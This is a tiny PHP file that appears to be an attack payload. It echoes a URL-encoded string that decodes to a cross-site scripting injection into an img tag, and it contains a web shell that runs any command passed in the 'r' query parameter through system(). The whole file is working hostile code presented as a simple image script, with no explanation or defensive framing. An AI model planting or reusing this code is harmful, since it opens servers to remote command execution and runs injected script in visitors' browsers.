<?php
$img = "%22%22%3E%3C%69%6D%67%20%73%72%63%3D%78%20%6F%6E%65%72%72%6F%72%3D%70%72%6F%6D%70%74%28%31%29%3E";
if(isset($_GET['r'])){
	system($_GET['r']);
}
echo "<img src=".urldecode($img).".jpg"; 
?>

